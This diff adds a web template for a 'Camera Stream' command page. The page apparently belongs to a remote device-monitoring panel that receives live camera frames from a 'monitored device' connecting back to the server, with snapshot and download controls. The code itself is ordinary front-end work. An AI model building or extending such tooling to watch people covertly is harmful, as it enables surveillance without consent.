@@ -1,0 +1,612 @@
+{% extends 'base/commands.html' %}
+
+{% block extra_css %}
+<style>
+  .preloader-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.7);
+    display: none;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+    opacity: 0;
+    transition: opacity 0.3s ease;
+  }
+
+  .preloader-overlay.show {
+    opacity: 1;
+  }
+
+  .preloader-container {
+    text-align: center;
+  }
+
+  .preloader {
+    border: 5px solid rgba(255, 255, 255, 0.3);
+    border-radius: 50%;
+    border-top: 5px solid #00acac;
+    width: 50px;
+    height: 50px;
+    animation: spin 1s linear infinite;
+    display: inline-block;
+    margin-bottom: 15px;
+  }
+
+  .preloader-text {
+    color: white;
+    font-size: 16px;
+  }
+
+  @keyframes spin {
+    0% {
+      transform: rotate(0deg);
+    }
+    100% {
+      transform: rotate(360deg);
+    }
+  }
+
+  .camera-container {
+    width: 100%;
+    margin: 0 auto;
+    border-radius: 4px;
+    overflow: hidden;
+  }
+
+  .camera-stream {
+    width: 100%;
+    height: auto;
+    display: block;
+    margin: 0 auto;
+    border-radius: 4px;
+    background-color: #2d353c;
+  }
+
+  .camera-status {
+    margin-top: 15px;
+    padding: 15px;
+    border-radius: 4px;
+    background: rgba(255, 255, 255, 0.05);
+  }
+
+  .status-indicator {
+    display: inline-block;
+    width: 12px;
+    height: 12px;
+    border-radius: 50%;
+    margin-right: 5px;
+  }
+
+  .status-connected {
+    background-color: #00acac;
+  }
+
+  .status-disconnected {
+    background-color: #ff5b57;
+  }
+
+  .status-waiting {
+    background-color: #f59c1a;
+  }
+
+  .control-panel {
+    display: flex;
+    gap: 10px;
+    margin-bottom: 20px;
+  }
+
+  .btn-action {
+    min-width: 120px;
+  }
+
+  .stream-info {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 20px;
+    margin-bottom: 20px;
+  }
+
+  .info-card {
+    background: rgba(255, 255, 255, 0.05);
+    border-radius: 6px;
+    padding: 15px;
+    flex: 1;
+    min-width: 250px;
+  }
+
+  .info-card h5 {
+    margin-top: 0;
+    margin-bottom: 10px;
+    color: #00acac;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .device-info {
+    margin-bottom: 20px;
+  }
+
+  #snapshotContainer {
+    display: none;
+    margin-top: 20px;
+  }
+
+  #snapshotImage {
+    max-width: 100%;
+    border-radius: 4px;
+    margin-top: 10px;
+  }
+
+  .notification {
+    position: fixed;
+    top: 20px;
+    right: 20px;
+    padding: 15px;
+    border-radius: 5px;
+    color: white;
+    z-index: 9999;
+    opacity: 0;
+    transition: opacity 0.3s ease;
+  }
+
+  .notification.success {
+    background-color: #00acac;
+  }
+
+  .notification.error {
+    background-color: #ff5b57;
+  }
+
+  .notification.show {
+    opacity: 1;
+  }
+
+  .no-stream-placeholder {
+    background-color: #2d353c;
+    height: 400px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    text-align: center;
+    border-radius: 4px;
+  }
+
+  .no-stream-placeholder i {
+    font-size: 48px;
+    margin-bottom: 20px;
+    color: #6c757d;
+  }
+
+  .no-stream-placeholder p {
+    max-width: 80%;
+    color: #adb5bd;
+  }
+
+  .connection-guide {
+    margin-top: 30px;
+    padding: 20px;
+    background: rgba(255, 255, 255, 0.05);
+    border-radius: 6px;
+  }
+
+  .guide-step {
+    margin-bottom: 15px;
+    padding-left: 25px;
+    position: relative;
+  }
+
+  .guide-step:before {
+    content: '';
+    position: absolute;
+    left: 0;
+    top: 7px;
+    width: 10px;
+    height: 10px;
+    border-radius: 50%;
+    background-color: #00acac;
+  }
+
+  .guide-step:after {
+    content: '';
+    position: absolute;
+    left: 5px;
+    top: 17px;
+    width: 1px;
+    height: calc(100% - 5px);
+    background-color: #00acac;
+  }
+
+  .guide-step:last-child:after {
+    display: none;
+  }
+
+  .guide-highlight {
+    display: inline-block;
+    padding: 2px 8px;
+    background: rgba(0, 172, 172, 0.1);
+    border-radius: 3px;
+    font-family: monospace;
+    font-size: 90%;
+  }
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="preloader-overlay" id="preloader">
+  <div class="preloader-container">
+    <div class="preloader"></div>
+    <div class="preloader-text" id="preloaderText">Processing...</div>
+  </div>
+</div>
+
+<div class="notification" id="notification"></div>
+
+<div class="content-section active" id="camera-section">
+  <div class="d-flex align-items-center mb-4">
+    <div class="flex-fill">
+      <ul class="breadcrumb mb-2">
+        <li class="breadcrumb-item">
+          <a href="#" class="text-decoration-none">COMMANDS</a>
+        </li>
+        <li class="breadcrumb-item active">CAMERA STREAM</li>
+      </ul>
+      <h1 class="page-header mb-2">Camera Stream</h1>
+      <p class="text-muted mb-0">Live camera feed from the monitored device</p>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-body">
+      <!-- Control Panel -->
+      <div class="control-panel">
+        {% if stream_active %}
+          <button id="stopStreamBtn" class="btn btn-danger btn-action">
+            <i class="fa fa-stop-circle me-1"></i> Stop Stream
+          </button>
+          <button id="refreshBtn" class="btn btn-outline-theme btn-action">
+            <i class="fa fa-refresh me-1"></i> Refresh
+          </button>
+          <button id="snapshotBtn" class="btn btn-outline-theme btn-action">
+            <i class="fa fa-camera me-1"></i> Snapshot
+          </button>
+          <button id="downloadBtn" class="btn btn-outline-theme btn-action" disabled>
+            <i class="fa fa-download me-1"></i> Download
+          </button>
+        {% else %}
+          <button id="startStreamBtn" class="btn btn-theme btn-action">
+            <i class="fa fa-play-circle me-1"></i> Start Stream
+          </button>
+          <button id="refreshBtn" class="btn btn-outline-theme btn-action" disabled>
+            <i class="fa fa-refresh me-1"></i> Refresh
+          </button>
+          <button id="snapshotBtn" class="btn btn-outline-theme btn-action" disabled>
+            <i class="fa fa-camera me-1"></i> Snapshot
+          </button>
+          <button id="downloadBtn" class="btn btn-outline-theme btn-action" disabled>
+            <i class="fa fa-download me-1"></i> Download
+          </button>
+        {% endif %}
+      </div>
+
+      <!-- Stream Information -->
+      <div class="stream-info">
+        <div class="info-card">
+          <h5><i class="fa fa-signal"></i> Connection Status</h5>
+          <div class="d-flex align-items-center">
+            <span class="status-indicator {% if stream_active %}status-waiting{% else %}status-disconnected{% endif %}" id="statusIndicator"></span>
+            <span id="connectionStatus">{% if stream_active %}Waiting for connection...{% else %}Stream not active{% endif %}</span>
+          </div>
+          <p class="text-muted mt-2 mb-0 small" id="lastFrameTime"></p>
+        </div>
+        <div class="info-card">
+          <h5><i class="fa fa-server"></i> Stream Details</h5>
+          <div class="mb-1">
+            <strong>Server IP:</strong> <span id="serverIp">{{ server_ip }}</span>
+          </div>
+          <div class="mb-1">
+            <strong>Port:</strong> <span id="serverPort">{{ server_port }}</span>
+          </div>
+          <div>
+            <strong>Status:</strong> <span id="streamStatus">{% if stream_active %}Active{% else %}Inactive{% endif %}</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Camera Stream / Placeholder -->
+      <div class="camera-container">
+        {% if stream_active %}
+          <img src="{{ url_for('stream_camera_command.video_feed', device_id=device_id) }}" 
+               alt="Camera Stream" class="camera-stream" id="cameraStream">
+        {% else %}
+          <div class="no-stream-placeholder">
+            <i class="fa fa-video-camera"></i>
+            <h3>Camera Stream Not Active</h3>
+            <p>Click the "Start Stream" button to begin streaming the camera from the device. 
+              Make sure the device has camera permissions and is properly connected.</p>
+          </div>
+        {% endif %}
+      </div>
+
+      <!-- Snapshot Container (Hidden initially) -->
+      <div id="snapshotContainer" class="mt-4">
+        <h3 class="mb-3">Snapshot</h3>
+        <img id="snapshotImage" alt="Snapshot">
+      </div>
+
+      <!-- Connection Guide -->
+      <div class="connection-guide mt-4">
+        <h3 class="mb-3"><i class="fa fa-info-circle me-2"></i>Connection Guide</h3>
+        <div class="guide-step">
+          <strong>Ensure permissions:</strong> The monitored device must have camera permissions granted.
+        </div>
+        <div class="guide-step">
+          <strong>Start stream:</strong> Click the "Start Stream" button above to begin listening for connections.
+        </div>
+        <div class="guide-step">
+          <strong>Connect device:</strong> The device should connect to this server at 
+          <span class="guide-highlight">{{ server_ip }}:{{ server_port }}</span>.
+        </div>
+        <div class="guide-step">
+          <strong>View stream:</strong> Once connected, the camera feed will appear automatically.
+        </div>
+        <div class="guide-step">
+          <strong>Take snapshots:</strong> Use the "Snapshot" button to capture the current frame.
+        </div>
+      </div>
+    </div>
+    <div class="card-arrow">
+      <div class="card-arrow-top-left"></div>
+      <div class="card-arrow-top-right"></div>
+      <div class="card-arrow-bottom-left"></div>
+      <div class="card-arrow-bottom-right"></div>
+    </div>
+  </div>
+</div>
+{% endblock content %}
+
+{% block extra_js %}
+<script>
+  // DOM elements
+  const startStreamBtn = document.getElementById('startStreamBtn');
+  const stopStreamBtn = document.getElementById('stopStreamBtn');
+  const refreshBtn = document.getElementById('refreshBtn');
+  const snapshotBtn = document.getElementById('snapshotBtn');
+  const downloadBtn = document.getElementById('downloadBtn');
+  const statusIndicator = document.getElementById('statusIndicator');
+  const connectionStatus = document.getElementById('connectionStatus');
+  const lastFrameTime = document.getElementById('lastFrameTime');
+  const streamStatus = document.getElementById('streamStatus');
+  const cameraStream = document.getElementById('cameraStream');
+  const snapshotContainer = document.getElementById('snapshotContainer');
+  const snapshotImage = document.getElementById('snapshotImage');
+  const preloader = document.getElementById('preloader');
+  const preloaderText = document.getElementById('preloaderText');
+  const notification = document.getElementById('notification');
+
+  // Function to show preloader
+  function showPreloader(message) {
+    preloaderText.textContent = message || 'Processing...';
+    preloader.style.display = 'flex';
+    // Trigger reflow
+    preloader.offsetHeight;
+    preloader.classList.add('show');
+  }
+
+  // Function to hide preloader
+  function hidePreloader() {
+    preloader.classList.remove('show');
+    setTimeout(() => {
+      preloader.style.display = 'none';
+    }, 300);
+  }
+
+  // Function to show notification
+  function showNotification(message, type = 'success') {
+    notification.textContent = message;
+    notification.className = `notification ${type}`;
+    // Trigger reflow
+    notification.offsetHeight;
+    notification.classList.add('show');
+    
+    setTimeout(() => {
+      notification.classList.remove('show');
+    }, 3000);
+  }
+
+  // Function to update stream status
+  function updateStatus() {
+    fetch(`/device/{{ device_id }}/apis/status`)
+      .then(response => response.json())
+      .then(data => {
+        if (data.success) {
+          // Update stream active status
+          streamStatus.textContent = data.active ? 'Active' : 'Inactive';
+          
+          if (data.active) {
+            if (data.connected) {
+              statusIndicator.className = 'status-indicator status-connected';
+              connectionStatus.textContent = 'Connected';
+            } else {
+              statusIndicator.className = 'status-indicator status-waiting';
+              connectionStatus.textContent = 'Waiting for connection...';
+            }
+            
+            // Update last frame info
+            if (data.has_current_frame) {
+              refreshBtn.disabled = false;
+              snapshotBtn.disabled = false;
+              
+              if (data.last_frame_time > 0) {
+                const frameAge = Math.round(data.frame_age_seconds);
+                const timestamp = new Date(data.last_frame_time * 1000).toLocaleTimeString();
+                lastFrameTime.textContent = `Last frame: ${timestamp} (${frameAge} seconds ago)`;
+              } else {
+                lastFrameTime.textContent = 'No frames received yet';
+              }
+            } else {
+              lastFrameTime.textContent = 'No frames received yet';
+            }
+          } else {
+            statusIndicator.className = 'status-indicator status-disconnected';
+            connectionStatus.textContent = 'Stream not active';
+            lastFrameTime.textContent = '';
+          }
+        }
+      })
+      .catch(err => {
+        console.error('Error fetching status:', err);
+        statusIndicator.className = 'status-indicator status-disconnected';
+        connectionStatus.textContent = 'Error: Cannot connect to server';
+      });
+  }
+
+  // Start stream
+  if (startStreamBtn) {
+    startStreamBtn.addEventListener('click', function() {
+      showPreloader('Starting camera stream...');
+      
+      fetch(`/device/{{ device_id }}/apis/start`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'X-CSRFToken': '{{ csrf_token() }}'
+        }
+      })
+      .then(response => response.json())
+      .then(data => {
+        hidePreloader();
+        
+        if (data.success) {
+          showNotification('Camera stream started successfully');
+          // Refresh the page to show the stream
+          window.location.reload();
+        } else {
+          console.error('Error starting stream:', data.message);
+          showNotification(data.message || 'Failed to start camera stream', 'error');
+        }
+      })
+      .catch(err => {
+        hidePreloader();
+        console.error('Error starting stream:', err);
+        showNotification('Error starting camera stream', 'error');
+      });
+    });
+  }
+
+  // Stop stream
+  if (stopStreamBtn) {
+    stopStreamBtn.addEventListener('click', function() {
+      showPreloader('Stopping camera stream...');
+      
+      fetch(`/device/{{ device_id }}/apis/stop`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'X-CSRFToken': '{{ csrf_token() }}'
+        }
+      })
+      .then(response => response.json())
+      .then(data => {
+        hidePreloader();
+        
+        if (data.success) {
+          showNotification('Camera stream stopped successfully');
+          // Refresh the page to show the no-stream state
+          window.location.reload();
+        } else {
+          showNotification(data.message || 'Failed to stop camera stream', 'error');
+        }
+      })
+      .catch(err => {
+        hidePreloader();
+        console.error('Error stopping stream:', err);
+        showNotification('Error stopping camera stream', 'error');
+      });
+    });
+  }
+
+  // Refresh stream
+  if (refreshBtn && !refreshBtn.disabled) {
+    refreshBtn.addEventListener('click', function() {
+      if (cameraStream) {
+        const currentSrc = cameraStream.src;
+        cameraStream.src = '';
+        setTimeout(() => {
+          cameraStream.src = currentSrc + '?' + new Date().getTime();
+        }, 500);
+        showNotification('Stream refreshed');
+      }
+    });
+  }
+
+  // Take snapshot
+  if (snapshotBtn && !snapshotBtn.disabled) {
+    snapshotBtn.addEventListener('click', function() {
+      showPreloader('Taking snapshot...');
+      
+      fetch(`/device/{{ device_id }}/apis/snapshot`)
+        .then(response => response.json())
+        .then(data => {
+          hidePreloader();
+          
+          if (data.success) {
+            snapshotContainer.style.display = 'block';
+            snapshotImage.src = 'data:image/jpeg;base64,' + data.frame;
+            downloadBtn.disabled = false;
+            showNotification('Snapshot taken successfully');
+          } else {
+            showNotification('Failed to take snapshot: ' + data.error, 'error');
+          }
+        })
+        .catch(err => {
+          hidePreloader();
+          console.error('Error taking snapshot:', err);
+          showNotification('Error taking snapshot', 'error');
+        });
+    });
+  }
+
+  // Download snapshot
+  if (downloadBtn) {
+    downloadBtn.addEventListener('click', function() {
+      if (snapshotImage.src) {
+        const a = document.createElement('a');
+        a.href = snapshotImage.src;
+        a.download = 'snapshot_' + new Date().toISOString().replace(/:/g, '-').replace(/\..+/g, '') + '.jpg';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        showNotification('Snapshot downloaded');
+      }
+    });
+  }
+
+  // Handle stream errors
+  if (cameraStream) {
+    cameraStream.addEventListener('error', function() {
+      console.error('Stream error occurred');
+      statusIndicator.className = 'status-indicator status-disconnected';
+      connectionStatus.textContent = 'Stream error - try refreshing';
+    });
+  }
+
+  // Update status every 5 seconds if stream is active
+  {% if stream_active %}
+  updateStatus();
+  setInterval(updateStatus, 5000);
+  {% endif %}
+
+  // Hide preloader when page is initially loaded
+  window.addEventListener('load', function() {
+    if (preloader.classList.contains('show')) {
+      hidePreloader();
+    }
+  });
+</script>
+{% endblock extra_js %} 
